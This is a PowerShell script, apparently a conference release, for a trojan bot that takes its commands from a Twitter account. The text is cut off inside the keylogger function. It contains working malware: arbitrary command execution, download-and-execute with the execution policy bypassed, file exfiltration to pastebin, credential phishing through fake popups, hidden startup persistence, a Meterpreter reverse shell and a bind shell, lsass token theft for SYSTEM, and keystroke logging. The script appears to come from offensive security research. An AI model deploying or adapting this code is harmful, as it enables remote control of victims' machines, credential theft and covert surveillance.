Function Invoke-TwitterBot {
<#
.SYNOPSIS

    Invoke-TwitterBot

    Author: Chris Campbell (@obscuresec)
    License: BSD 3-Clause

.DESCRIPTION

    A trojan bot controlled by a twitter account that was released at Shmoocon IX
    
.EXAMPLE

    PS C:\> Invoke-TwitterBot -Verbose
   
.LINK

    https://github.com/obscuresec/shmoocon/blob/master/Invoke-TwitterBot
    http://www.obscuresec.com/


.NOTE

    To debug or test, run with the '-Verbose' command
    
    Commands:
        !quit 
            Ex: !quit
        !change
            Ex: !change|newevilPSbot 
        !speak 
            Ex: !speak|You have been hacked!
        !run 
            Ex: !run|net localgroup adminstrators > c:\windows\temp\ad.txt
        !downexec 
            Ex: !downexec|http://pastebinlikesite.com/moreevilpowershellscript.txt
        !download 
            Ex: !download|http://tools.hackarmoury.com/general_tools/nc/nc.exe|c:\windows\temp\svchost.exe
        !rickroll 
            Ex: !rickroll|http://www.youtube.com/watch?v=dQw4w9WgXcQ
        !shell 
            Ex: !shell|10.0.0.23|443
        !sleep 
            Ex: !sleep|9999
        !thunderstruck 
            Ex: !thunderstruck|http://www.youtube.com/watch?v=v2AC41dglnM
        !eicar 
            Ex: !eicar
        !screenshot 
            Ex: !screenshot|c:\temp\screen.png
        !popup 
            Ex: !popup|Administrative credentials are needed to install a pending update. You will be prompted shortly.|UPDATE PENDING
        !persist 
            Ex: !persist|http://pastebin.com/raw.php?i=Hqs2imY5
        !elevate 
            Ex: !elevate|http://blahblah.com/fjdads/script.raw
        !wallpaper 
            Ex: !wallpaper|http://itechbook.net/wp-content/uploads/6a00d8341c652b53ef017615ff8a0b970c-800wi.jpg/|c:\windows\temp\1.jpg
        !packetcapture 
            Ex: !packetcapture|10|c:\demo\|cap.log
        !getsystem 
            Ex: !getsystem
        !bindshell 
            Ex: !bindshell|8080
        !upload 
            !upload|c:\demo\keylog.txt
        !credential
            !credential|c:\temp\creds.txt

#>
    Function Invoke-Bot {
        [CmdletBinding()] Param(
        )

        #Build helper Functions
        
        #Implements the !change command which changes the twitter C2 username
        #Ex: !change|newevilPSbot
        Function ChangeCommand {
            [string] $NewC2Username = $LatestTweet.split('|')[1]
            Write-Verbose "Changing C2 from $TwitterUserName to $NewC2Username"
            $Global:TwitterUserName = $NewC2Username
        }
            
        #Implements the !speak command which does text-to-speech
        #Ex: !speak|You have been hacked!
        Function SpeakCommand {
            [string] $AudioMessage = $LatestTweet.split('|')[1]
            
            #Raise the volume to make sure they hear us
            1..50 | Foreach {
                    $WscriptObject = New-Object -com wscript.shell
                    $WscriptObject.SendKeys([char]175)
                }
            
            #Create a COM object to pass the message to
            $ComVoiceObject = New-Object -ComObject SAPI.SpVoice
            Write-Verbose "I should be speaking now"
            [void] $ComVoiceObject.Speak($AudioMessage)
        }
            
        #Implements the !run command which executes arbitrary commands
        #Ex: !run|net localgroup adminstrators > c:\windows\temp\ad.txt
        Function RunCommand {
            [string] $Command = $LatestTweet.Substring(5)
            #Using Substring instead of split in case their is a "|" in the command specified
            [string] $CmdPath = "$env:windir\System32\cmd.exe"
            [string] $CmdString = "$CmdPath" + " /C " + "$Command"
            #Chose IEX cause it handles arguments as a string but will wait until cmd completes
            Write-Verbose "I am running: $CmdString"
            Invoke-Expression $CmdString
        }

        #Implements the !downexec command which downloads ps script and executes without writing to disk
        #Ex: !downexec|http://pastebinlikesite.com/moreevilpowershellscript
        Function downexecCommand {
            [string] $downloadURL = $LatestTweet.split('|')[1]
                                           
            if ($downloadURL.Substring(0,5) -ceq "https") {
                # Ignore invalid/self-signed SSL certificates
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
            }
                               
            #Twitter automatically shortens every URL so we need to get the actual URL
            $WebRequest = [System.Net.WebRequest]::create($downloadURL)
            $WebResponse = $WebRequest.GetResponse()
            $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
            $WebResponse.Close()
            Write-Verbose "I am downloading from $ActualdownloadURL"
            
            $downloadedScript = $WebClientObject.downloadString($ActualdownloadURL)
            #Need to bypass potentially restrictive ExecutionPolicies
            $CmdString = 'PowerShell.exe -Exec Bypass -NoL -Com $downloadedScript'
            Write-Verbose "I am executing $CmdString"
            Invoke-Expression $CmdString
        }
                    
        #Implements the !download command which downloads a file to specified path and filename. Ex: !download|http://blahblah.com|c:\windows\temp\mimikatz.exe
        #Ex: !download|http://tools.hackarmoury.com/general_tools/nc/nc.exe|c:\windows\temp\svchost.exe
        Function downloadCommand {
            [string] $downloadURL = $LatestTweet.split('|')[1]
            [string] $FileOnDisk =  $LatestTweet.split('|')[2]

            if ($downloadURL.Substring(0,5) -ceq "https") {
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
            }

            #Twitter automatically shortens every URL so we need to get the actual URL
            $WebRequest = [System.Net.Webrequest]::create($downloadURL)
            $WebResponse = $WebRequest.GetResponse()
            $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
            $WebResponse.Close()
            Write-Verbose "I am downloading from $ActualdownloadURL"
            Write-Verbose "I am saving the file to $FileOnDisk"
            $downloadedScript = $WebClientObject.downloadFile($downloadURL,"$FileOnDisk")
        }
            
        #Implements the !rickroll command which opens IE to a youtube video defaults to rickroll if none supplied (feature request by Matt Graeber)
        #Ex: !rickroll|http://www.youtube.com/watch?v=dQw4w9WgXcQ
        Function RickrollCommand {
            [string] $VideoURL = $LatestTweet.split('|')[1]
            #Set the URL to youtube rickroll if URL wasn't supplied
            if ($VideoURL -eq $null) {
                [string] $VideoURL = "http://www.youtube.com/watch?v=dQw4w9WgXcQ"
            }
            
            #Raise the volume to make sure they hear us
            1..50 | Foreach {
                    $WscriptObject = New-Object -com wscript.shell
                    $WscriptObject.SendKeys([char]175)
                }
            
            [string] $CmdString = "$env:SystemDrive\PROGRA~1\INTERN~1\iexplore.exe $VideoURL"
            Write-Verbose "I am now opening IE to $VideoUrl"
            Invoke-Expression $CmdString
        }
                                      
        #Implement the !upload command to upload files pastebin.ca where the paste name will be the uniquestring variable
        #Ex: !upload|c:\demo\keylog.txt
        Function UploadCommand {
            [string] $File = $LatestTweet.split('|')[1]
            
            #If the file is found, encode it in base64
            if (Test-Path $File) {
                $FileBytes = [System.IO.File]::ReadAllBytes($File)
                $EncodedFile = [System.Convert]::ToBase64String($FileBytes)
                
                if ($EncodedFile.length -lt 15000) { 
                    $PasteName = $UniqueString
                    $ApiKey = $WebClientObject.DownloadString('http://pastebin.ca/apikey.php')
                    
                    #Create a collections object to place post parameters in, postkey may expire?
                    $CollectionObject = New-Object System.Collections.Specialized.NameValueCollection
                    $CollectionObject.Add('content',"$EncodedFile")
                    $CollectionObject.Add('name',"$UniqueString")
                    $CollectionObject.Add('postkey','d2d59669f40943f1bf3bdb6141fd1c9a38bc2ad4')
                    $CollectionObject.Add('postkeysig','icWKPdAtFFCOV8jZRb9MhcOpqOl2LIVBfq4lgnPSGQ4%3D')
                    $CollectionObject.Add('s','Submit+Post')

                    #call uploadvalues method of webclient
                    $Upload = ($WebClientObject.UploadValues("http://pastebin.ca/quiet-paste.php?api=$ApiKey", $CollectionObject))  
                }
            }
        }

        #Implements the !wallpaper command to download and set the wallpaper to the new image
        #Ex: !wallpaper|http://itechbook.net/wp-content/uploads/6a00d8341c652b53ef017615ff8a0b970c-800wi.jpg/|c:\windows\temp\1.jpg
        Function WallpaperCommand {
            [string] $downloadURL = $LatestTweet.split('|')[1]
            [string] $FileOnDisk =  $LatestTweet.split('|')[2]

            if ($downloadURL.Substring(0,5) -ceq "https") {
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
            }

            #Twitter automatically shortens every URL so we need to get the actual URL
            $WebRequest = [System.Net.Webrequest]::create($downloadURL)
            $WebResponse = $WebRequest.GetResponse()
            $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
            $WebResponse.Close()
            Write-Verbose "I am downloading from $ActualdownloadURL"
            Write-Verbose "I am saving the file to $FileOnDisk"
            $downloadedImage = $WebClientObject.downloadFile($downloadURL,"$FileOnDisk")
        
            #Set downloaded image as wallpaper, may take a few minutes to update
            Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name wallpaper -Value $FileOnDisk
            [string] $CmdString = 'rundll32.exe user32.dll, UpdatePerUserSystemParameters'
            Invoke-Expression $CmdString
        }

        #Implements the !credential command to recover the users password
        #!credential|c:\temp\cred.txt
        Function CredentialCommand {
            [string] $OutPath = $LatestTweet.split('|')[1]
            
            if (Test-Path -Path (Split-Path -Parent $OutPath) -Pathtype container) {
                $UserCredential = Get-Credential  
                $UserCredential.Password | ConvertFrom-SecureString
                
                #Convert password to plaintext
                $Password = $UserCredential.GetNetworkCredential().Password
                $Username = $UserCredential.UserName
                
                #Create a custom object to store the results in
                $ObjectProperties = @{'Username' = $Username;
                                      'Password' = $Password}                             
                $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
                
                #Output results to file
                Out-File -FilePath $OutPath -Append -InputObject $ResultsObject
            }
        }
    
        #Implements the !popup command to send a message to the user
        #!popup|Administrative credentials are needed to install a pending update. You will be prompted shortly.|UPDATE PENDING
        Function PopupCommand {
            [string] $PopupMessage = $LatestTweet.split('|')[1]
            [string] $PopupTitle = $LatestTweet.split('|')[2]
            Add-Type -AssemblyName "System.Drawing","System.Windows.Forms"
            [Windows.Forms.MessageBox]::Show($PopupMessage, $PopupTitle, [Windows.Forms.MessageBoxButtons]::OK, [Windows.Forms.MessageBoxIcon]::Information)
        }
 
        #Implements the !shell command to invoke-shellcode with meterpreter https payload 
        #Ex: !shell|10.0.0.23|443"
        Function ShellCommand {
            [string] $Lhost = $LatestTweet.split('|')[1]
            [string] $Lport = $LatestTweet.split('|')[2]
            [string] $downloadURL = 'https://github.com/mattifestation/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1'
            Write-Verbose "I am downloading from $ActualdownloadURL"
            $downloadedScript = $WebClientObject.downloadString($downloadURL)
            #append Function call with parameters
            [string] $AppendString = "Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $Lhost -Lport $Lport -force"
            $downloadedScript += $AppendString
            Invoke-Expression $downloadedScript
        }
        
        #Implements the !sleep command to sleep for specified number of seconds              
        #Ex: !sleep|9999
        Function SleepCommand {
            #Parse instructions for the amount of time to sleep
            [string] $SecondsToWait = $LatestTweet.split('|')[1]
            #Start sleeping
            Write-Verbose "Sleeping for $SecondsToWait seconds"
            Start-Sleep -Seconds $SecondsToWait       
        }

        #Implements the !persist command to download this script or another hosted stager script and drop it into the startup folder as a shortcut
        #Ex: !persist|http://pastebin.com/raw.php?i=Hqs2imY5
        Function PersistCommand {
            
            [string] $downloadURL = $LatestTweet.split('|')[1]
            #This is hardcoded in due to MAX_PATH limitations in shortcuts. if changed $RunPath must be reencoded and must remain under 259 characters
            [string] $FileOnDisk = "$env:programdata\cache.db"

            if ($downloadURL.Substring(0,5) -ceq "https") {
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
            }

            #Twitter automatically shortens every URL so we need to get the actual URL
            $WebRequest = [System.Net.Webrequest]::create($downloadURL)
            $WebResponse = $WebRequest.GetResponse()
            $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
            $WebResponse.Close()
            Write-Verbose "I am downloading from $ActualdownloadURL"
            Write-Verbose "I am saving the file to $FileOnDisk"
            $downloadedScript = $WebClientObject.downloadFile($downloadURL,$FileOnDisk)
            $RunPath = '%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe -exe bypass -nol -win hidden -enc JABBACAAPQAgAEcAQwAgACQAZQBuAHYAOgBQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABjAGEAYwBoAGUALgBkAGIAOwAgAEkARQBYACAAJABBAA=='

                    if ($IsAdmin -eq $True) {
                        [string] $PersistencePath = "$env:ALLUSERSPROFILE" + '\Microsoft\Windows\Start Menu\Programs\StartUp\StartUp.lnk'
                    }

                    else {
                        [string] $PersistencePath = "$env:USERPROFILE" + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\StartUp.lnk'
                    }
               
                    $WScript = New-Object -ComObject Wscript.Shell
                    $Shortcut = $Wscript.CreateShortcut($PersistencePath)
                    $Shortcut.TargetPath = ($RunPath)
                    $Shortcut.Save()
        }       
        
        #This implements the !elevate command which downloads a script and prompts the user to enter admin credentials
        #Ex: !elevate|http://blahblah.com/fjdads/script.raw
        Function ElevateCommand {
            
            if ($IsAdmin -eq $False) {
            
                [string] $downloadURL = $LatestTweet.split('|')[1]
                                           
                if ($downloadURL.Substring(0,5) -ceq "https") {
                    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
                }
                               
                $WebRequest = [System.Net.WebRequest]::create($downloadURL)
                $WebResponse = $WebRequest.GetResponse()
                $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
                $WebResponse.Close()
            
                Write-Verbose "I am downloading from $ActualdownloadURL"
                $downloadedScript = $WebClientObject.downloadString($ActualdownloadURL)
            
                $CmdArgs = '-Exe Bypass -NoL -Com $downloadedScript'
                $CmdString = 'Start-Process PowerShell.exe -Verb RunAs -ArgumentList ' + '$CmdArgs'
                
                Write-Verbose "I am executing $CmdString"
                Invoke-Expression $CmdString    
            }
        }

        #This implements the !screenshot command which takes a screenshot and saves as a png where specified 
        #Ex: !screenshot|c:\temp\screen.png 
        Function ScreenshotCommand {
            [string] $FilePath = $LatestTweet.split('|')[1]
            Add-Type -Assembly System.Windows.Forms
            $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen
            $ScreenshotObject = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height
            $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
            $DrawingGraphics.CopyFromScreen( $ScreenBounds.Location, [Drawing.Point]::Empty, $ScreenBounds.Size)
            $DrawingGraphics.Dispose()
            $ScreenshotObject.Save($FilePath)
            $ScreenshotObject.Dispose() 
        }
    
        #This implements the !eicar command which flags antivirus and will stall the script for a few minutes
        #Ex: !eicar
        Function EicarCommand {
            [string] $FilePath = "$env:temp\eicar.com"
            [string] $EncodedEicar = 'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo='
            
            if (!(Test-Path -Path $FilePath)) {
                $EicarBytes = [System.Convert]::FromBase64String($EncodedEicar)
                [string] $Eicar = [System.Text.Encoding]::UTF8.GetString($EicarBytes)
                Set-Content -Value $Eicar -Encoding ascii -Path $FilePath -Force
            }   
        }

        #This implements the !thunderstruck command which blasts AC/DC while forcing the volume max
        #Ex: !thunderstruck|http://www.youtube.com/watch?v=v2AC41dglnM
        Function ThunderstruckCommand {
            [string] $VideoURL = $LatestTweet.split('|')[1]
            #Set the URL to youtube thunderstruck if URL wasn't supplied
            if ($VideoURL -eq $null) {
                [string] $VideoURL = "http://www.youtube.com/watch?v=v2AC41dglnM"
            }
            
            #Create hidden IE Com Object
            $IEComObject = New-Object -com "InternetExplorer.Application"
            $IEComObject.visible = $False
            $IEComObject.navigate($VideoURL)
            $EndTime = (Get-Date).addminutes(3)
            Write-Verbose "Loop will end at $EndTime"
                #ghetto way to do this but it basically presses volume up to raise volume in a loop for 3 minutes
                do {
                    $WscriptObject = New-Object -com wscript.shell
                    $WscriptObject.SendKeys([char]175)
                }
                
                until ((Get-Date) -gt $EndTime)
        }

        #This implements the !packetcapture command which requires admin rights. Makes use of netsh to capture up to 25Mb of packets for a specified amount of time in minutes, 
        #Ex: !packetcapture|10|c:\demo\|cap.log
        Function PacketCaptureCommand {
            [int32] $CaptureLength = $LatestTweet.split('|')[1]
            [string] $Path = $LatestTweet.split('|')[2]
            [string] $FileName = $LatestTweet.split('|')[3]
            
            $EndTime = (Get-Date).addminutes($CaptureLength)
            
            Function Capture {
                #Check the path supplied and use temp if it doesn't exist
                if ((Test-Path $Path) -eq $False) {
                    try {
                        New-Item $Path -type directory
                    }
                    catch {
                        $Path = "$Env:temp"
                    }
                }

                $FilePath = (Join-Path $Path $FileName) 

                if ($IsAdmin -eq $True) {
                #This command requires admin rights. 25MB was chosen due to needing to be encoded for upload to filebin.
                [string] $CmdString = "netsh trace start capture=yes maxSize=25MB overwrite=yes traceFile=`"$FilePath`""
                Invoke-Expression $CmdString | Out-Null
                }
            }

            Function Cleanup {
                #Stop the trace and cleanup the cab file
                [string] $CabFile = ((Get-ChildItem $FilePath).BaseName) + '.cab'
                [string] $CabPath = (Join-Path $Path $CabFile) 
                [string] $StopCmdString = 'netsh trace stop'
                [string] $CleanCmdString = "del $CabPath"
                Invoke-Expression $StopCmdString | Out-Null
                Invoke-Expression $CleanCmdString
           }
                   
            if ($IsAdmin -eq $True) {
                
                Start-Job -scriptblock {Capture} | Out-Null
            
                do {
                    Start-Sleep -Seconds 1
                }
                
                until ((Get-Date) -gt $EndTime) {
                    Cleanup
                    Start-Sleep -Seconds 10
                    Get-Job | Remove-Job -Force        
                }
            }
        }
          
        #This implements the !bindshell command which starts a bindshell on the client for a specified port
        #This was adapted from code released by Dave Kennedy and Josh Kelley at Defcon 18
        #Ex: !bindshell|31337|120
        Function BindShell {
            [int32] $TcpListenerPort = $LatestTweet.split('|')[1]

            #Open the port in the windows firewall with a com object           
            if ($IsAdmin -eq $True) {
                $FirewallMgrObject = New-Object -Com HNetCfg.FwMgr
                $PortObject = New-Object -Com HNetCfg.FwOpenPort
                $PortObject.Name = "Windows Update Service"
                $PortObject.Port = $TcpListenerPort
                $PortObject.Protocol = 6
                $FirewallMgrObject.LocalPolicy.CurrentProfile.GloballyOpenPorts.Add($PortObject)
            }
      
            #if not admin, user may be prompted to open a new port in the windows firewall
            $AsciiEncoding = New-Object System.Text.AsciiEncoding
            $IpEndpoint = New-Object System.Net.IpEndpoint ([System.Net.Ipaddress]::any, $TcpListenerPort)
            $TcpListener = New-Object System.Net.Sockets.TcpListener $IpEndpoint
            $TcpListener.Start()
            $TcpSocket = $TcpListener.AcceptTcpClient()
            $NetworkStream = $TcpSocket.GetStream()
            $NetworkBuffer = New-Object System.Byte[] $TcpSocket.ReceiveBufferSize
            $BindProcess = New-Object System.Diagnostics.Process 
            $BindProcess.StartInfo.FileName = "C:\\Windows\\System32\\cmd.exe"
            $BindProcess.StartInfo.Arguments = "/k"
            $BindProcess.StartInfo.RedirectStandardInput = 1
            $BindProcess.StartInfo.RedirectStandardoutput = 1
            $BindProcess.StartInfo.UseShellExecute = 0
            $BindProcess.Start()
            $InputStream = $BindProcess.StandardInput
            $OutputputStream = $BindProcess.Standardoutput
 
            Start-Sleep 1
 
                while($OutputputStream.Peek() -ne -1){
                    $ReturnString += $AsciiEncoding.GetString($OutputputStream.Read())
                }

                $NetworkStream.Write($AsciiEncoding.GetBytes($ReturnString),0,$ReturnString.Length)
                $ReturnString = '' 
                $Done = $False | Out-Null

                while (-not $Done) {
                    $Position = 0
                    $i = 1
    
                    while (($i -gt 0) -and ($Position -lt $NetworkBuffer.Length)) {
                                    $Reader = $NetworkStream.Read($NetworkBuffer,$Position,$NetworkBuffer.Length - $Position)
                        $Position+=$Reader
        
                        if ($Position -and ($NetworkBuffer[0..$($Position-1)] -contains 10)) {
                            break
                        }
                    }
    
                    if ($Position -gt 0) {
                        $ReturnString = $AsciiEncoding.GetString($NetworkBuffer,0,$Position)
                        $InputStream.write($ReturnString)
                        $Output = $AsciiEncoding.GetString($OutputputStream.Read())
 
                        while ($OutputputStream.Peek() -ne -1){
                            $Output += $AsciiEncoding.GetString($OutputputStream.Read())
                        }
        
                        $NetworkStream.Write($AsciiEncoding.GetBytes($Output),0,$Output.length)
                        $Output = $Null | Out-Null
                    }
    
                    else {
                        $Done = $True | Out-Null
                    }
                }
        }

        #This implements the !getsystem command which was taken from a script written by Matt Graeber
        #Ex: !getsystem
        Function GetSystem {

            if ($IsAdmin -eq $True) {

                $DynAssembly = New-Object Reflection.AssemblyName('AdjPriv')
                $AssemblyBuilder = [Appdomain]::Currentdomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
                $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('AdjPriv', $False)
                $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'

                $TokPriv1LuidTypeBuilder = $ModuleBuilder.DefineType('TokPriv1Luid', $Attributes, [System.ValueType])
                $TokPriv1LuidTypeBuilder.DefineField('Count', [Int32], 'Public') | Out-Null
                $TokPriv1LuidTypeBuilder.DefineField('Luid', [Int64], 'Public') | Out-Null
                $TokPriv1LuidTypeBuilder.DefineField('Attr', [Int32], 'Public') | Out-Null
                $TokPriv1LuidStruct = $TokPriv1LuidTypeBuilder.CreateType()

                $LuidTypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType])
                $LuidTypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
                $LuidTypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
                $LuidStruct = $LuidTypeBuilder.CreateType()

                $Luid_and_AttributesTypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType])
                $Luid_and_AttributesTypeBuilder.DefineField('Luid', [LUID], 'Public') | Out-Null
                $Luid_and_AttributesTypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
                $Luid_and_AttributesStruct = $Luid_and_AttributesTypeBuilder.CreateType()

                $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
                $ConstructorValue = [Runtime.InteropServices.UnmanagedType]::ByValArray
                $FieldArray = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
                $TokenPrivilegesTypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType])
                $TokenPrivilegesTypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
                $PrivilegesField = $TokenPrivilegesTypeBuilder.DefineField('Privileges', [LUID_AND_ATTRIBUTES[]], 'Public')
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 1))
                $PrivilegesField.SetCustomAttribute($AttribBuilder)
                $TokenPrivilegesStruct = $TokenPrivilegesTypeBuilder.CreateType()

                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder(([Runtime.InteropServices.DllImportAttribute].GetConstructors()[0]), 'advapi32.dll', @([Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')), @([Bool] $True))

                $Win32TypeBuilder = $ModuleBuilder.DefineType('Win32Methods', $Attributes, [ValueType])
                $Win32TypeBuilder.DefinePInvokeMethod('DuplicateToken', 'advapi32.dll', [Reflection.MethodAttributes] 'Public, Static', [Reflection.CallingConventions]::Standard, [Bool], @([IntPtr], [Int32], [IntPtr].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, 'Auto').SetCustomAttribute($AttribBuilder)
                $Win32TypeBuilder.DefinePInvokeMethod('SetThreadToken', 'advapi32.dll', [Reflection.MethodAttributes] 'Public, Static', [Reflection.CallingConventions]::Standard, [Bool], @([IntPtr], [IntPtr]), [Runtime.InteropServices.CallingConvention]::Winapi, 'Auto').SetCustomAttribute($AttribBuilder)
                $Win32TypeBuilder.DefinePInvokeMethod('OpenProcessToken', 'advapi32.dll', [Reflection.MethodAttributes] 'Public, Static', [Reflection.CallingConventions]::Standard, [Bool], @([IntPtr], [UInt32], [IntPtr].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, 'Auto').SetCustomAttribute($AttribBuilder)
                $Win32TypeBuilder.DefinePInvokeMethod('LookupPrivilegeValue', 'advapi32.dll', [Reflection.MethodAttributes] 'Public, Static', [Reflection.CallingConventions]::Standard, [Bool], @([String], [String], [IntPtr].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, 'Auto').SetCustomAttribute($AttribBuilder)
                $Win32TypeBuilder.DefinePInvokeMethod('AdjustTokenPrivileges', 'advapi32.dll', [Reflection.MethodAttributes] 'Public, Static', [Reflection.CallingConventions]::Standard, [Bool], @([IntPtr], [Bool], [TokPriv1Luid].MakeByRefType(), [Int32], [IntPtr], [IntPtr]), [Runtime.InteropServices.CallingConvention]::Winapi, 'Auto').SetCustomAttribute($AttribBuilder)
                $Win32TypeBuilder.CreateType() | Out-Null

                $Win32Native = [Int32].Assembly.GetTypes() | ? {$_.Name -eq 'Win32Native'}
                $GetCurrentProcess = $Win32Native.GetMethod('GetCurrentProcess', [Reflection.BindingFlags] 'NonPublic, Static')
                
                $SE_PRIVILEGE_ENABLED = 0x00000002
                $STANDARD_RIGHTS_REQUIRED = 0x000F0000
                $STANDARD_RIGHTS_READ = 0x00020000
                $TOKEN_ASSIGN_PRIMARY = 0x00000001
                $TOKEN_DUPLICATE = 0x00000002
                $TOKEN_IMPERSONATE = 0x00000004
                $TOKEN_QUERY = 0x00000008
                $TOKEN_QUERY_SOURCE = 0x00000010
                $TOKEN_ADJUST_PRIVILEGES = 0x00000020
                $TOKEN_ADJUST_GROUPS = 0x00000040
                $TOKEN_ADJUST_DEFAULT = 0x00000080
                $TOKEN_ADJUST_SESSIONID = 0x00000100
                $TOKEN_READ = $STANDARD_RIGHTS_READ -bor $TOKEN_QUERY
                $TOKEN_ALL_ACCESS = $STANDARD_RIGHTS_REQUIRED -bor $TOKEN_ASSIGN_PRIMARY -bor $TOKEN_DUPLICATE -bor $TOKEN_IMPERSONATE -bor $TOKEN_QUERY -bor $TOKEN_QUERY_SOURCE -bor $TOKEN_ADJUST_PRIVILEGES -bor $TOKEN_ADJUST_GROUPS -bor $TOKEN_ADJUST_DEFAULT -bor $TOKEN_ADJUST_SESSIONID

                [long]$luid = 0

                $tokPriv1Luid = New-Object TokPriv1Luid
                $tokPriv1Luid.Count = 1
                $tokPriv1Luid.Luid = $luid
                $tokPriv1Luid.Attr = $SE_PRIVILEGE_ENABLED

                $retVal = [Win32Methods]::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$tokPriv1Luid.Luid)

                $htoken = [IntPtr]::Zero
                $retVal = [Win32Methods]::OpenProcessToken($GetCurrentProcess.Invoke($null, @()), $TOKEN_ALL_ACCESS, [ref]$htoken)

                $tokenPrivileges = New-Object TOKEN_PRIVILEGES
                $retVal = [Win32Methods]::AdjustTokenPrivileges($htoken, $false, [ref]$tokPriv1Luid, 12, [IntPtr]::Zero, [IntPtr]::Zero)

                if(-not($retVal)) {
                    Return
                }

                $process = (Get-Process -Name lsass)
                [IntPtr]$hlsasstoken = [IntPtr]::Zero
                $retVal = [Win32Methods]::OpenProcessToken($process.Handle, ($TOKEN_IMPERSONATE -bor $TOKEN_DUPLICATE), [ref]$hlsasstoken)

                [IntPtr]$dulicateTokenHandle = [IntPtr]::Zero
                $retVal = [Win32Methods]::DuplicateToken($hlsasstoken, 2, [ref]$dulicateTokenHandle)

                $retval = [Win32Methods]::SetThreadToken([IntPtr]::Zero, $dulicateTokenHandle)
                if(-not($retVal)) {
                    Return
                }
            }
        }

        #This implements the !keylog command which will log all keys to c:\windows\temp\key.log  
        #Ex: !keylog
        Function KeyLog {
            $ScriptBlock = {

            [string] $OutPath = 'c:\windows\temp\key.log'

                function LogKey {
                    $ImportStatement = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 

[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);

[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);

[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern IntPtr GetForegroundWindow();
'@
                    #required imports
                    $ImportDll = Add-Type -MemberDefinition $ImportStatement -Namespace Win32 -Name Util -PassThru
    
                    Start-Sleep -Milliseconds 40

                        try {
                            [string] $LogOutput = ''

                            #loop through typeable characters to see which is pressed
                            for ($TypeableChar = 1; $TypeableChar -le 254; $TypeableChar++) {
                                $VirtualKey = $TypeableChar
                                $KeyResult = $ImportDll::GetAsyncKeyState($VirtualKey)

                                #if the key is pressed
                                if ($KeyResult -eq -32767) {
            
                                    #check for keys not mapped by virtual keyboard
                                    $LeftShift = $ImportDll::GetAsyncKeyState(160)
                                    $RightShift = $ImportDll::GetAsyncKeyState(161)                
                                    $LeftCtrl = $ImportDll::GetAsyncKeyState(162)
                                    $RightCtrl = $ImportDll::GetAsyncKeyState(163)
                                    $LeftAlt = $ImportDll::GetAsyncKeyState(164)
                                    $RightAlt = $ImportDll::GetAsyncKeyState(165)
                                    $TabKey = $ImportDll::GetAsyncKeyState(9)
                                    $SpaceBar = $ImportDll::GetAsyncKeyState(32)
                                    $DeleteKey = $ImportDll::GetAsyncKeyState(127)
                                    $EnterKey = $ImportDll::GetAsyncKeyState(13)
                                    $BackSpaceKey = $ImportDll::GetAsyncKeyState(8)
                                    $LeftArrow = $ImportDll::GetAsyncKeyState(37)
                                    $RightArrow = $ImportDll::GetAsyncKeyState(39)
                                    $UpArrow = $ImportDll::GetAsyncKeyState(38)
                                    $DownArrow = $ImportDll::GetAsyncKeyState(34)
                                    $LeftMouse = $ImportDll::GetAsyncKeyState(1)
                                    $RightMouse = $ImportDll::GetAsyncKeyState(2)
                
                                    #if any of the keys are pressed then it will return either -32767 or -32768
